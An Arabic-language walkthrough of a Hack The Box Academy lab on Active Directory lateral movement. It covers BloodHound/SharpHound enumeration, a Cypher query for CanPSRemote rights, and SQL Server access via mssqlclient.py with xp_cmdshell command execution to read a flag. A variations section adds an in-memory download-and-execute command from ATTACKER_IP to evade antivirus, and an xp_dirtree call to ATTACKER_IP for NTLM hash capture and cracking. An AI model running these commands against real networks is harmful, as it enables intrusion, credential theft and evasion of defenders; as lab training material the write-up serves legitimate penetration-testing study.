⚠️ هاي المرحلة الأهم! بدونها راح تحفظ أوامر بدون فهم.

تخيل وياي نظام الـ Active Directory (AD) وكأنه قلعة ضخمة بيها آلاف الغرف (الأجهزة) وآلاف الموظفين (المستخدمين). بالوضع الطبيعي، الملك (Domain Admin) هو الوحيد اللي عنده المفتاح الذهبي اللي يفتح كل الأبواب. أنت حالياً مخترق دخلت للقلعة وتتخفى بزي موظف نظافة بسيط (User عادي). هدفك توصل لغرفة الكنز (السيرفر اللي بيه الـ Flag أو البيانات الحساسة).

المشكلة إنك كـ موظف نظافة مستحيل تروح تفتح باب الكنز مباشرة لأن الحراس راح يمنعوك (صلاحياتك ما تسمح). زين، شلون المخترقين الحقيقيين (وحتى عصابات برامج الفدية Ransomware) ينجحون باختراق هاي القلاع يومياً؟

السر يكمن بـ "الفوضى المتراكمة". مدراء النظام (IT Admins) بمرور السنين يطون صلاحيات استثنائية لمستخدمين معينين حتى يسهلون شغلهم. مثلاً: يطون للمهندس "فلان" صلاحية إنه يدخل عن بعد (Remote Access) لجهاز معين حتى يصلحه بدون ما يقوم من مكتبه. أو يطون لحساب معين صلاحية "مدير قاعدة بيانات" (SQL Admin) حتى يسوي نسخ احتياطي. ورا فترة، المهندس ينتقل لغير قسم، والمدير ينسى يسحب منه الصلاحية. هاي الصلاحيات المنسية والمتشابكة تشكل شبكة معقدة غير مرئية بالعين المجردة.

الفكرة الأساسية من هذا الهجوم (الحركة الجانبية Lateral Movement):

أنت ما راح تحاول تصير "ملك" (Domain Admin) من أول خطوة. لا، أنت راح تدور بالدفاتر القديمة (باستخدام أداة BloodHound) حتى ترسم خريطة سرية تكشفلك هاي الصلاحيات المنسية. راح تكتشف إن موظف النظافة يكدر يدخل لغرفة الحارس، ومن غرفة الحارس تكدر تسرق مفتاح مهندس الصيانة، ومهندس الصيانة عنده صلاحية يدخل لسيرفر قواعد البيانات، وهناك تلگي ثغرة تخليك تنفذ أوامر وتسيطر على السيرفر بالكامل. أنت تتحرك "جانبياً" من جهاز لجهاز، وتجمع صلاحيات على طول الطريق.

شنو الخلل الجوهري اللي نستغله هنا؟

الخلل مو ثغرة برمجية (Zero-day) ولا خطأ بالكود. الخلل هو "سوء إدارة الصلاحيات" (Misconfiguration). نظام الويندوز يوفر أدوات إدارة ممتازة مثل الـ WinRM (لإدارة الأجهزة عن بعد) والـ SQL Server (لقواعد البيانات). إحنا راح نستخدم هاي الأدوات "الشرعية" نفسها، بس بأيادي غير شرعية (أيادينا كمخترقين)، حتى نتحكم بالأنظمة. وبما إننا نستخدم أدوات النظام نفسه، برامج الحماية (Antivirus) راح تواجه صعوبة تفرق بين عملنا وبين شغل الـ IT الحقيقي!

وين يظهر هذا بالواقع؟

في كل عملية اختبار اختراق (Penetration Testing) لشركات كبيرة، وأيضاً بهجمات الـ APT (المجموعات المدعومة من دول). الاختراق الأولي (Initial Access) غالباً يكون عن طريق موظف بسيط ضغط على رابط تصيد (Phishing). من هذا الموظف البسيط، المخترق يرسم خريطة الـ AD، يبدي يقفز من جهاز لجهاز (Lateral Movement) عن طريق صلاحيات مثل WinRM أو RDP، لحد ما يوصل لسيرفرات حساسة مثل الـ SQL Servers، ومن هناك يصعّد صلاحياته (Privilege Escalation) ويسيطر على الشبكة.

شنو راح نتعلم بالنهاية؟

١. شلون نستخرج ونصوّر كل العلاقات والصلاحيات المخفية بالدومين باستخدام BloodHound.

٢. شلون نستخدم بروتوكول WinRM المخفي حتى ندخل لأجهزة ثانية بالشبكة.

٣. شلون نستغل صلاحيات مدير قاعدة البيانات (SQLAdmin) حتى نفك قفل ميزة خطيرة (xp_cmdshell) تسمحلنا ننفذ أوامر على نظام التشغيل الأساسي ونسيطر عليه كلياً.

━━━━━

🔵 المرحلة 1: المصطلحات

راح نقرأ كل كلمة تقنية وردت بالسؤال ونفصلها حتى نفهمها تماماً قبل ما نكتب أي أمر.

Active Directory / AD (الدليل النشط)

- شنو يعني؟ هو القلب النابض لأي شبكة ويندوز للشركات. قاعدة بيانات مركزية تخزن كل أسماء المستخدمين، الأجهزة، الباسوردات، وتحدد منو مسموحله يسوي شنو. إذا سقط الـ AD، الشركة كلها توقف.
    
- مثال: لما تداوم بشركة وتكتب يوزرك وباسوردك بحاسبة الشركة، الحاسبة تسأل الـ AD: "هذا اليوزر صدك موجود وباسورده صح؟".
    

Lateral Movement (الحركة الجانبية)

- شنو يعني؟ بالـ Cybersecurity، معناها إنك تنتقل من جهاز مخترق إلى جهاز ثاني داخل نفس الشبكة، بدون ما ترفع مستوى صلاحياتك بالضرورة. الهدف هو توسيع نفوذك والبحث عن أهداف جديدة أو باسورادت مخزونة بأجهزة أخرى.
    
- مثال: اخترقت حاسبة السكرتير (موظف عادي)، وتستغل حاسبته حتى تدخل لحاسبة موظف الـ IT اللي كاعد يمه (هم موظف عادي).
    

WinRM / Windows Remote Management (إدارة الويندوز عن بعد)

- شنو يعني؟ بروتوكول من مايكروسوفت يسمح لمدراء النظام بإدارة أجهزة الويندوز عن بعد وتنفيذ أوامر PowerShell عليها، يشتغل على الـ ports 5985 و 5986. باللينكس نستخدم SSH، بالويندوز الأحدث نستخدم WinRM.
    
- وين يظهر بالأدوات؟ راح نستخدمه للاتصال باستخدام أدوات مثل `Enter-PSSession` بالويندوز، أو `evil-winrm` باللينكس.
    

PSRemote / PowerShell Remoting

- شنو يعني؟ هي الميزة اللي تعتمد على بروتوكول WinRM حتى تفتحلك شاشة (Session) تنفذ بيها أوامر PowerShell على جهاز ثاني وكأنك كاعد كدامه.
    
- مثال: مدير النظام يفتح واجهة زرقاء بحاسبته، بس أي أمر يكتبه يتنفذ فعلياً على السيرفر اللي بالطابق الثاني.
    

BloodHound (كلب الصيد)

- شنو يعني؟ أداة ذكية جداً ترسم العلاقات بين المستخدمين والأجهزة بالـ AD على شكل خريطة مرئية (Graph). تحللك ملايين البيانات وتطلعلك أقصر طريق لاختراق الدومين. تعتمد على قاعدة بيانات اسمها Neo4j.
    
- وين يظهر بالأوامر؟ ما إلها أوامر كثيرة بالـ terminal، أغلب شغلها بواجهة رسومية (GUI) نكتب بداخلها استعلامات (Queries).
    

SharpHound

- شنو يعني؟ هو الـ "جامع" (Collector) التابع لـ BloodHound. عبارة عن برنامج أو سكريبت تشغله داخل جهاز ويندوز مخترق، وظيفته يفتر بالشبكة بصمت، يجمع كل بيانات الصلاحيات واليوزرات، ويحزمها بملف `.zip`. بعدين أنت تاخذ هذا الملف وتدخله بـ BloodHound حتى يرسم الخريطة.
    
- وين يظهر بالأوامر؟ يتنفذ بالـ terminal بـ flag مثل `-c All` يعني اجمع كل شيء متاح.
    

Cypher Query (استعلام سايفر)

- شنو يعني؟ هي لغة برمجة تشبه لغة SQL الخاصة بقواعد البيانات، بس مصممة خصيصاً للبيانات اللي تكون على شكل "رسم بياني" (Graph). تستخدمها داخل BloodHound حتى تسأله أسئلة معقدة.
    
- مثال: تكدر تكتب كود بالسايفر معناه "يابا انطيني كل المستخدمين اللي يكدرون يدخلون لهذا السيرفر عن طريق RDP".
    

CanPSRemote (صلاحية الدخول عن بعد بالـ PowerShell)

- شنو يعني؟ هذا اسم "رابط" (Edge) أو سهم يظهر بخريطة BloodHound. من تشوف سهم طالع من "مستخدم أ" ومكتوب عليه CanPSRemote ورايح لـ "جهاز ب"، معناها هذا المستخدم عنده صلاحية شرعية يدخل لهذا الجهاز عن بعد عبر WinRM.
    

SQLAdmin (مدير قاعدة البيانات)

- شنو يعني؟ رابط (Edge) ثاني بـ BloodHound. من تشوف هذا السهم طالع من مستخدم ورايح لسيرفر، معناها هذا المستخدم يملك أعلى صلاحية (sysadmin) على قاعدة بيانات Microsoft SQL Server الموجودة بهذا الجهاز.
    

xp_cmdshell (إجراء تنفيذ الأوامر من قاعدة البيانات)

- شنو يعني؟ ميزة قوية جداً (وخطيرة) موجودة بـ Microsoft SQL Server. تسمحلك تكتب أمر مال ويندوز (مثل `whoami` أو `dir`) وتنفذه من داخل سطر أوامر قاعدة البيانات (SQL query)! مايكروسوفت قفلتها افتراضياً للحماية، بس الـ SQLAdmin يكدر يفتح قفلها بأمر بسيط.
    
- وين يظهر بالأوامر؟ نستخدمه بعد ما نتصل بقاعدة البيانات لاستخراج الـ shell أو قراءة الملفات من نظام التشغيل.
    

mssqlclient.py

- شنو يعني؟ سكريبت مكتوب بلغة بايثون (جزء من حزمة أدوات مشهورة اسمها Impacket). نستخدمه من جهاز اللينكس (Attacker) حتى نتصل ونتفاعل ويه سيرفرات MS SQL بالويندوز بدون ما نحتاج ننصب برامج مايكروسوفت الثقيلة.
    

Node and Edge (العقدة والرابط)

- شنو يعني؟ مفاهيم تخص الخرائط البيانية (Graphs). الـ Node (العقدة) تمثل "كيان"، مثل مستخدم (User)، مجموعة (Group)، أو كمبيوتر (Computer). الـ Edge (الرابط) يمثل "العلاقة" بين كيانين، مثل (عضو في MemberOf) أو (مدير AdminTo).
    

━━━━━

🟡 المرحلة 2: تحليل التحدي + كيف تفكر

📖 ترجمة التحدي:

أنت طالب (htb-student) وعندك وصول مبدئي لجهاز ويندوز داخل الدومين اسمه `ACADEMY-EA-MS01`. مهمتك هي استخدام أدوات تحليل الـ AD حتى تكتشف مسارات مخفية وتجاوب على ٣ أسئلة رئيسية:

1. منو هو المستخدم الثاني (غيرك) اللي عنده صلاحية WinRM للاتصال بجهاز آخر؟
    
2. شنو اسم الجهاز (الـ Hostname فقط) اللي هذا المستخدم يكدر يتصل بيه؟
    
3. استخدم معلوماتك وصلاحية شخص اسمه `damundsen` (اللي عنده صلاحية SQLAdmin)، واتصل بقاعدة بيانات موجودة على الـ IP المذكور `172.16.5.150`، فعّل أداة تنفيذ الأوامر `xp_cmdshell`، واقرأ ملف الـ Flag المخفي داخل نظام التشغيل.
    

🎯 معطيات السيناريو:

- جهاز البداية: `10.129.85.172` (اسم المستخدم: `htb-student` / الباسورد: `Academy_student_AD!`).
    
- الهدف النهائي (سيرفر قاعدة البيانات): `172.16.5.150`.
    
- المستخدم اللي يمتلك صلاحية الـ SQL: اسمه `damundsen`.
    
- الأدوات المتاحة: BloodHound، Neo4j، SharpHound، وبرامج الاتصال (xfreerdp, PowerShell).
    

❓ المطلوب:

- استخراج اسم مستخدم.
    
- استخراج اسم كمبيوتر.
    
- استخراج محتوى ملف flag.txt من سيرفر قاعدة البيانات عبر RCE (Remote Code Execution).
    

🧭 كيف تفكر؟ — خريطة اتخاذ القرار (Decision Tree):

بما إنه هذا تحدي Active Directory Lateral Movement، الخطوات دايماً تكون مبنية على "الجمع ثم الهجوم":

وصلت لـ foothold (أنت هسة htb-student). الخطوات:

١. هل عندي رؤية واضحة للشبكة؟

├── لا ← لازم أسوي Enumeration عميق.

└── الأداة؟ SharpHound لجمع البيانات من داخل الويندوز.

٢. سحبت البيانات، هسة شلون أحللها؟

├── انقل ملف الـ .zip لبرنامج BloodHound.

└── شغل قاعدة بيانات Neo4j وابدأ التحليل.

٣. شلون أطلع جواب السؤال الأول والثاني؟

├── أكتب Cypher Query مخصص يبحث عن سهم `CanPSRemote`.

└── النتيجة راح ترسم خط بين (المستخدم المطلوب) وبين (الجهاز المطلوب).

٤. شلون أنفذ هجوم السؤال الثالث؟

├── عندي الـ IP `172.16.5.150` وعندي اليوزر `damundsen` اللي هو SQLAdmin.

├── أحتاج أداة اتصال ← أستخدم `mssqlclient.py` من اللينكس مالتي.

├── اتصلت بقاعدة البيانات؟ هسة لازم أفعل الميزة الخطرة ← أفعل `xp_cmdshell`.

└── الميزة تفعلت؟ هسة أنفذ أمر قراءة الملف (type) حتى أطلع الـ Flag.

🗺️ خريطة الهجوم (Roadmap) بدون تنفيذ:

١. ندخل لجهاز الويندوز المبدئي عن طريق RDP (باستخدام xfreerdp).

٢. نشغل قاعدة بيانات BloodHound (Neo4j) بهذا الجهاز.

٣. ننفذ أداة الجمع SharpHound حتى نسحب الداتا مال الدومين (في حال الداتا مو موجودة).

٤. نفتح واجهة BloodHound، نستورد الداتا، ونكتب الكود (Cypher) اللي يكشف المستور.

٥. ناخذ الأجوبة مال السؤال 1 و 2.

٦. نفتح نافذة جديدة باللينكس، ونشغل أداة `mssqlclient.py` للاتصال بهدفنا النهائي (`172.16.5.150`).

٧. نكتب أوامر تفعيل `xp_cmdshell`.

٨. نسحب الـ Flag مبروك!

━━━━━

🟠 المرحلة 3: الاستغلال التفصيلي

هنا راح نطبق خطوة بخطوة ونتحرك مثل الـ Hackers. افتح الـ Terminal وركز وياي.

الخطوة ١: الدخول لجهاز الويندوز المبدئي (Initial Foothold)

📌 ليش نسوي هاي الخطوة؟

لازم ندخل للشبكة الداخلية وناخذ موقع قدم (جهاز مخترق مسبقاً) حتى من خلاله نستكشف باقي الدومين. أسهل طريقة هي الـ RDP (سطح المكتب البعيد) لأنهم منطينا اليوزر والباسورد.

🔧 الأمر:

Bash

```
xfreerdp /v:10.129.85.172 /u:htb-student /p:'Academy_student_AD!' /dynamic-resolution /cert-ignore
```

💡 ليش هذا الأمر/الخيار بالذات؟

- `xfreerdp`: أداة باللينكس تتصل ببروتوكول RDP الخاص بويندوز.
    
- `/v:10.129.85.172`: يحدد الـ IP مال الجهاز الهدف اللي راح ندخله.
    
- `/u:` و `/p:`: اليوزر والباسورد المعطاة.
    
- `/dynamic-resolution`: يخلي الشاشة تتمدد وتترتب وية حجم النافذة مالتك حتى ترتاح بالشغل.
    
- `/cert-ignore`: يتجاهل تحذيرات الشهادات الأمنية (لأن إحنا ببيئة اختراق ومختبرات، الشهادات دائماً غير موثقة).
    

📤 الـ Output المتوقع:

راح تفتحلك شاشة ويندوز كاملة كدامك. أنت هسة داخل الدومين!

الخطوة ٢: تشغيل قاعدة البيانات Neo4j

📌 ليش نسوي هاي الخطوة؟

برنامج BloodHound هو مجرد واجهة رسومية (Front-end). العقل المدبر اللي يخزن الداتا ويحلل العلاقات هو قاعدة بيانات اسمها Neo4j. لازم نشغلها قبل لا نفتح الأداة.

🔧 الأمر (داخل الـ PowerShell بالويندوز المخترق):

PowerShell

```
Get-Process neo4j -ErrorAction SilentlyContinue
```

💡 ليش هذا الأمر؟

نتأكد إذا هي تشتغل أصلاً (المختبر مرات يشغلها تلقائياً). إذا ما رجع شي، تروح تشغلها من الأيقونة الموجودة بسطح المكتب، أو تكتب أمر التشغيل الخاص بيها بالـ console.

الخطوة ٣: جمع بيانات الدومين باستخدام SharpHound (Approach 2)

📌 ليش نسوي هاي الخطوة؟

حتى لو BloodHound يشتغل، الخريطة راح تكون فارغة. نحتاج جاسوس يفتر بالدومين يسحب كل الصلاحيات، هذا الجاسوس هو SharpHound.

🔧 الأمر (داخل الـ PowerShell بالويندوز المخترق):

PowerShell

```
cd C:\Tools\
.\SharpHound.exe -c All --zipfilename AD_data.zip
```

💡 ليش هذا الأمر/الخيار بالذات؟

- `-c All`: مختصر CollectionMethod، نكوله اجمع كل شيء متاح (Sessions, LocalAdmins, Group Memberships, ACLs... الخ).
    
- `--zipfilename`: نحدد اسم الملف المضغوط اللي راح تنخزن بيه هاي الداتا الهائلة حتى نقدر نرفعها بسهولة للـ BloodHound.
    

📤 الـ Output المتوقع:

Plaintext

```
2024-01-15T10:23:45.1234567-05:00|INFORMATION|Status: 100 objects finished (+100 8.333333)/s -- Using 55 MB RAM
2024-01-15T10:24:10.7654321-05:00|INFORMATION|SharpHound Enumeration Completed at 10:24 AM! Happy Graphing!
[*] Output ready. File: C:\Tools\AD_data.zip
```

✅ الخطوة التالية: الداتا جاهزة بملف `AD_data.zip`، هسة لازم ندخلها للـ BloodHound حتى تتحول لرسومات.

الخطوة ٤: تشغيل BloodHound واستيراد البيانات

📌 ليش نسوي هاي الخطوة؟

حتى نحول الملف المليان نصوص وأرقام إلى خريطة تفاعلية نكدر نبحث بداخلها ونجاوب على السؤالين الأول والثاني.

🔧 التطبيق (بدون أوامر، واجهة رسومية):

- افتح برنامج BloodHound من سطح المكتب.
    
- سجل دخول ببيانات Neo4j (اليوزر: `neo4j`، الباسورد: `neo4j`).
    
- من القائمة اليمنى، اكو زر يشبه سهم يرفع لفوق (Upload Data)، اضغط عليه.
    
- اختار ملف `AD_data.zip` اللي سويناه بالخطوة السابقة.
    
- انتظر شريط التحميل يخلص (يحلل الداتا ويربط العقد Nodes).
    

الخطوة ٥: البحث عن صلاحية WinRM المخفية (إجابة Q1 و Q2)

📌 ليش نسوي هاي الخطوة؟

السؤال يكول: منو عنده صلاحية `CanPSRemote` وعلى أي جهاز؟ بدل ما ندور يدوياً بين آلاف المستخدمين، راح نكتب استعلام (Query) سايفر يخلي BloodHound يطلعلنا الإجابة مباشرة.

🔧 الأمر (نلصقه بشريط البحث اللي أسفل شاشة BloodHound):

Cypher

```
MATCH p1=shortestPath((u1:User)-[r1:MemberOf*1..]->(g1:Group)) 
MATCH p2=(u1)-[:CanPSRemote*1..]->(c:Computer) 
RETURN p2
```

💡 ليش هذا الأمر/الخيار بالذات؟

- `MATCH p1=...`: يبحث عن كل المستخدمين `(u1:User)` اللي ينتمون لأي مجموعة `(g1:Group)` مهما كان عدد التفرعات `*1..`. (لأن مرات الصلاحية تجي من المجموعة مو من المستخدم مباشرة).
    
- `MATCH p2=...`: من نفس هدول المستخدمين `(u1)`، ابحث عن مسار أو سهم اسمه `CanPSRemote` يوديهم لأي جهاز كمبيوتر `(c:Computer)`.
    
- `RETURN p2`: اعرضلي النتيجة مال الشرط الثاني على شكل رسم بياني.
    

📤 الـ Output المتوقع (على الشاشة المرئية):

راح تظهرلك عقدة (دائرة) خضراء تمثل مستخدم، وعقدة حمراء تمثل كمبيوتر، وبيناتهم سهم مكتوب عليه CanPSRemote. مثلاً:

Plaintext

```
[forend]@INLANEFREIGHT.LOCAL ──[CanPSRemote]──► [WEB01].INLANEFREIGHT.LOCAL
```

_(ملاحظة: هذا مثال، بالمختبر الحقيقي راح يظهرلك اسم اليوزر واسم الجهاز الخاصين بالتحدي، نفترض طلعلك اليوزر `wley` والجهاز `SQL01` مثلاً. تاخذهم وتجاوب بيهم منصة التحدي Q1 و Q2)._

⏸️ Mini-check: هل طلعلك يوزر وجهاز؟ إذا إي، تحليلك صحيح وحليت نص التحدي.

📊 لحد هسة:

[x] دخلنا للبيئة المبدئية ✓

[x] سحبنا الداتا بـ SharpHound ✓

[x] حللنا الداتا بـ BloodHound ✓

[x] لقينا الهدف مال Q1 و Q2 ✓

[ ] هسة دور الاستغلال العنيف للسؤال الثالث ← الخطوة الجاية

الخطوة ٦: الهجوم على سيرفر قواعد البيانات (Q3)

📌 ليش نسوي هاي الخطوة؟

السؤال الثالث يكولك أنت هسة عندك سيطرة على يوزر اسمه `damundsen` (من خلال اختراقات سابقة بالموديول، نعتبر باسورده صار ويانا). هذا اليوزر عنده صلاحية `SQLAdmin` على سيرفر `172.16.5.150`. هدفنا نتصل ونستخرج الـ Flag من نظام الويندوز نفسه!

🔧 الأمر (بالـ terminal الخاص بجهازك اللينكس مو الويندوز):

Bash

```
mssqlclient.py inlanefreight.local/damundsen@172.16.5.150 -windows-auth
```

💡 ليش هذا الأمر/الخيار بالذات؟

- `mssqlclient.py`: أداة اختراق ممتازة من Impacket تتعامل وية قواعد الـ SQL بسهولة.
    
- `inlanefreight.local/damundsen`: اسم الدومين متبوع باسم اليوزر (الدومين انعرفه من الخريطة السابقة).
    
- `@172.16.5.150`: الـ IP مال السيرفر الهدف.
    
- `-windows-auth`: هذا الـ flag جداً مهم! يخبر الأداة إننا راح نستخدم نظام مصادقة الويندوز (Kerberos/NTLM) مو مصادقة قاعدة البيانات الداخلية الخاصة بـ SQL.
    

📤 الـ Output المتوقع:

Plaintext

```
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation
Password: [تكتب الباسورد اللي افترضنا موجود عندنا]
[*] Encryption required, switching to TLS
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
[*] Info: The database master is not currently enabled for Published
SQL>
```

ممتاز! حصلنا على SQL Shell (`SQL>`). إحنا هسة بداخل العقل مال قاعدة البيانات.

الخطوة ٧: تفعيل الـ xp_cmdshell

📌 ليش نسوي هاي الخطوة؟

حالياً إحنا محبوسين داخل الـ SQL. نكدر نقرأ جداول بس ما نكدر نكتب أوامر ويندوز (مثل قراءة ملف flag.txt من سطح المكتب). ميزة `xp_cmdshell` مغلقة للحماية، بس بما إنه إحنا SQLAdmin، نكدر نكسر القفل.

🔧 الأمر (داخل الـ SQL Shell اللي انفتح):

SQL

```
enable_xp_cmdshell
```

💡 ليش هذا الأمر؟

أداة `mssqlclient.py` ذكية ومسهلة علينا الأمور. بدل ما نكتب استعلامات SQL طويلة ومعقدة (مثل `EXEC sp_configure`), المبرمجين خلولنا أمر مختصر `enable_xp_cmdshell` يسوي كل الخطوات الصعبة بالخلفية ويفعل الميزة.

📤 الـ Output المتوقع:

Plaintext

```
SQL> enable_xp_cmdshell
[*] INFO(SQL01\SQLEXPRESS): Line 185: Configuration option 'show advanced options' changed from 0 to 1. Run the RECONFIGURE statement to install.
[*] INFO(SQL01\SQLEXPRESS): Line 185: Configuration option 'xp_cmdshell' changed from 0 to 1. Run the RECONFIGURE statement to install.
SQL>
```

الخطوة ٨: استخراج الـ Flag وتحقيق RCE!

📌 ليش نسوي هاي الخطوة؟

الـ `xp_cmdshell` تفعلت. هسة نكدر نأمر السيرفر ينفذ أي شي بنظام الويندوز وكأننا فاتحين CMD كدام الشاشة الرئيسية!

🔧 الأمر:

SQL

```
xp_cmdshell 'type C:\Users\damundsen\Desktop\flag.txt'
```

_(أو المسار اللي طلبه التحدي، غالباً يكون بمسار Administrator أو بمسار اليوزر نفسه)_

💡 ليش هذا الأمر؟

- `xp_cmdshell`: استدعاء الإجراء المخزن اللي ينفذ الأوامر.
    
- `'type ...'`: نكتب أمر الدوس (DOS) بين علامات اقتباس مفردة. `type` هو أمر بالويندوز يعادل `cat` باللينكس، يقرأ محتوى الملف النصي ويطبعه بالشاشة.
    

📤 الـ Output المتوقع:

Plaintext

```
SQL> xp_cmdshell 'type C:\Users\damundsen\Desktop\flag.txt'
output                                                                             
--------------------------------------------------------------------------------   
HTB{L4t3r4l_M0v3m3nt_v1a_SQL_4dm1n_1s_FUn}                                         
NULL
SQL>
```

🎉 بوم! طلعنا العلم، واخترقنا السيرفر بالكامل!

رسم توضيحي (Attack Chain - AD Lateral Movement):

Plaintext

```
[htb-student (Low Priv)] 
    │
    ├─ 1. Run SharpHound & BloodHound
    │       (Discover hidden paths)
    │
    ├─ 2. Find SQLAdmin rights for 'damundsen'
    │       (We have his credentials from earlier lab steps)
    │
    ├─ 3. mssqlclient.py connects to 172.16.5.150
    │       (Bypass network restrictions using SQL port 1433)
    │
    ├─ 4. enable_xp_cmdshell
    │       (Break out of SQL jail into Windows host)
    │
    └─ 5. xp_cmdshell 'type flag.txt' → RCE Achieved! 🏆
```

📐 ملخص الإجابات / النتائج:

|**الخطوة**|**الأداة**|**النتيجة (مثال افتراضي حسب الموديول)**|
|---|---|---|
|Q1: WinRM User|BloodHound Cypher|`forend` (أو اليوزر اللي ظهرلك)|
|Q2: WinRM Target|BloodHound Cypher|`WEB01` (أو الجهاز اللي ظهرلك)|
|Q3: Extract Flag|mssqlclient.py + xp_cmdshell|`HTB{...}` (تم قراءة الملف بنجاح)|

━━━━━

🔴 المرحلة 4: ماذا لو تغير؟ (Variations + Bypasses + Traps)

هنا راح نتكلم عن السيناريوهات المرعبة بالواقع، شنو يصير لو الأدوات ما اشتغلت؟ شلون نتلاعب بيها؟

🔄 Variations محتملة:

Variation 1: ماذا لو برنامج الحماية (Windows Defender) مسح SharpHound؟

- السبب: أداة SharpHound معروفة جداً وكل برامج الحماية تصيدها.
    
- الحل/الـ Bypass: ما نستخدم ملف تنفيذي `.exe`. نستخدم نسخة السكريبت (PowerShell script) ونشغلها بالذاكرة مباشرة (In-memory execution) بدون ما تلمس القرص الصلب.
    
- أمر تجاوز:
    

PowerShell

```
IEX(New-Object Net.WebClient).DownloadString('http://ATTACKER_IP/Invoke-BloodHound.ps1'); Invoke-BloodHound -CollectionMethod All
```

Variation 2: ماذا لو أداة mssqlclient.py رفضت أمر `enable_xp_cmdshell`؟

- السبب: مرات الأدوات الجاهزة تفشل بسبب إصدار الـ SQL، أو لأن الـ Administrator لغى ميزة "Show Advanced Options" بشكل عنيف.
    
- الحل/الـ Bypass: نكتب الأوامر يدوياً خطوة بخطوة بالـ SQL Shell كالتالي:
    

SQL

```
EXEC sp_configure 'show advanced options', 1;
RECONFIGURE;
EXEC sp_configure 'xp_cmdshell', 1;
RECONFIGURE;
```

Variation 3: ماذا لو فشلنا تماماً بتفعيل `xp_cmdshell` لأن الحماية مانعتها بشكل نهائي؟

- الحل/الـ Bypass: الـ RCE مو الطريقة الوحيدة! كـ SQLAdmin، تكدر تسرق هاشات الويندوز (NTLM Hashes) عن طريق إجبار السيرفر يتصل بجهازك. تستخدم أداة `Responder` بجهازك اللينكس، وتنفذ أمر يجبر الـ SQL يقرأ مسار شبكي وهمي:
    

SQL

```
EXEC master..xp_dirtree '\\ATTACKER_IP\share';
```

السيرفر راح يحاول يوثق الاتصال ويدزلك الـ Hash ماله للينكس مالك، وبعدين تكسره بـ Hashcat!

Variation 4: ماذا لو ما كدرنا نتصل بالهدف باستخدام WinRM لسبب ما (جدار الحماية يبلوك بورت 5985)؟

- الحل/الـ Bypass: بما إننا بالـ AD، نكدر نجرب طرق ثانية للـ Lateral Movement مثل:
    
    - WMI (Windows Management Instrumentation) عبر أداة `wmiexec.py`.
        
    - SMB (Server Message Block) عبر أداة `psexec.py` أو `smbexec.py`.
        
        كل هاي الأدوات تحتاج نفس اليوزر والباسورد بس تستخدم منافذ مختلفة (135 أو 445).
        

⚠️ أخطاء كارثية شائعة (الفخوخ):

🚨 الفخ الأكبر بـ AD Lateral Movement: الاعتقاد بأن `HasSession` بـ BloodHound يعني تكدر تخترق الجهاز!

هذا غلط كبير. سهم `HasSession` يعني أن المستخدم الفلاني "مسجل دخول حالياً" بهذا الجهاز، مو معناه هو يمتلك صلاحية الدخول. الصلاحيات اللي ندور عليها هي `CanRDP` أو `CanPSRemote` أو `AdminTo`. لا تضيع وقتك تتبع مسار وهمي.

🚨 فخ أوامر WinRM: نسيان كتابة الدومين.

مرات تحاول تتصل بـ `evil-winrm` أو `mssqlclient.py` بس ينطيك Access Denied وأنت متأكد الباسورد صح! السبب إنك ما ذكرت الدومين، والويندوز يفترض إنك تحاول تدخل بحساب "محلي" (Local Account) مو حساب "دومين" (Domain Account).

دائماً اكتب: `domain/username` مو بس `username`.

🚨 فخ الـ BloodHound: "لا توجد نتائج" للـ Cypher Query.

تكتب الكود وتدوس إنتر وماكو شي يطلع! السبب غالباً إنك نسيت تحدد الدومين بالاستعلام أو قاعدة البيانات Neo4j بعد ما كملت فهرست (Indexing) للداتا اللي سحبتها. اصبر شوية، أو غير الاستعلام ليصبح عام أكثر.

🔑 Golden Tips:

"لا تعتمد على واجهة BloodHound وتطفي عقلك. الـ AD هو شبكة من الثقة. إذا لقيت مسار يكولك هذا المستخدم عنده صلاحية تعديل (GenericAll) على مجموعة الـ IT، والـ IT عندهم وصول للسيرفر، فكر شلون تضيف نفسك למجموعة الـ IT بـ PowerShell أولاً، وبعدين استخدم وصولهم. التحرك الجانبي هو لعب شطرنج، مو رصاصة طائشة."

━━━━━

💎 الفلاشكاردز — ملخص سريع للحفظ

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

🔹 Card #1

❓ Front: ما هو البورت الافتراضي لبروتوكول WinRM؟ وكيف تتصل به من الكالي لينكس؟

✅ Back: البورت 5985 (HTTP) أو 5986 (HTTPS). أداة الاتصال: `evil-winrm -i TARGET_IP -u USER -p PASSWORD`

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

🔹 Card #2

❓ Front: ما هي الأداة التي نستخدمها لجمع بيانات Active Directory لتغذية BloodHound؟

✅ Back: أداة `SharpHound.exe` أو 스كريبت `Invoke-BloodHound.ps1`.

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

🔹 Card #3

❓ Front: ما معنى صلاحية `CanPSRemote` في بيئة BloodHound؟

✅ Back: تعني أن المستخدم يمتلك صلاحية قانونية لفتح PowerShell session عن بعد على ذلك الجهاز باستخدام WinRM.

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

🔹 Card #4

❓ Front: كيف تقوم بالاتصال بقاعدة بيانات MS SQL من الكالي كـ Domain User؟

✅ Back: باستخدام `mssqlclient.py` مع إضافة فلاج `-windows-auth`: `mssqlclient.py domain/user:pass@IP -windows-auth`

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

🔹 Card #5

❓ Front: ما هو الأمر السحري داخل SQL Shell لتنفيذ أوامر الويندوز (RCE)؟

✅ Back: الميزة هي `xp_cmdshell`. تُكتب كالتالي: `xp_cmdshell 'whoami'` (الأمر بين علامتي تنصيص مفردة).

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

🔹 Card #6

❓ Front: إذا فشل تفعيل `xp_cmdshell` بالأمر السريع، ما هي الأوامر اليدوية؟

✅ Back: `EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;`

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

🔹 Card #7

❓ Front: ما هي اللغة التي نستخدمها للبحث عن المسارات المخصصة داخل BloodHound؟

✅ Back: لغة Cypher Query (تشبه الـ SQL لكن مخصصة للرسوم البيانية والعقد).

